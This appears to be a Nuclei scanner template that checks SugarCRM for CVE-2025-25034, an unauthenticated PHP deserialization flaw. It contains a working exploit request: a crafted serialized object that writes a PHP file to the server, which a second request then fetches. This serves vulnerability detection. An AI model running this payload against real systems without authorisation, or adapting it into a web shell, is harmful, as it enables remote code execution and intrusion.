id: CVE-2025-25034

info:
  name: SugarCRM - PHP Object Injection (Unauthenticated Remote Code Execution)
  author: default
  severity: critical
  description: |
    A PHP object injection vulnerability exists in SugarCRM versions prior to 6.5.24, 6.7.13, 7.5.2.5, 7.6.2.2, and 7.7.1.0 due to improper validation of PHP serialized input in the SugarRestSerialize.php script. The vulnerable code fails to sanitize the rest_data parameter before passing it to the unserialize() function. This allows an unauthenticated attacker to submit crafted serialized data containing malicious object declarations, resulting in arbitrary code execution within the application context. Although SugarCRM released a prior fix in advisory sugarcrm-sa-2016-001, the patch was incomplete and failed to address some vectors.
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/sugarcrm_rest_unserialize_exec.rb
    - https://nvd.nist.gov/vuln/detail/CVE-2025-25034
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    cvss-score: 9.3
    cve-id: CVE-2025-25034
    cwe-id: CWE-502
  metadata:
    verified: true
    fofa-query: app="sugarcrm"
  tags: cve,cve2025,sugarcrm,rce,php,deserialization,unauth

variables:
  rand1: '{{rand_text_alpha(8)}}'
  upload_php: 'custom/{{rand_text_alpha(8)}}.php'

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /service/v4/rest.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=login&input_type=Serialize&rest_data=O:14:"SugarCacheFile":23:{S:17:"\00*\00_cacheFileName";s:22:"../{{upload_php}}";S:16:"\00*\00_cacheChanged";b:1;S:14:"\00*\00_localStore";a:1:{i:0;s:30:"<?php echo md5('{{rand1}}'); ?>";}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
        internal: true

  - raw:
      - |
        GET /{{upload_php}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'contains(body, md5(rand1))'
          - 'status_code == 200'
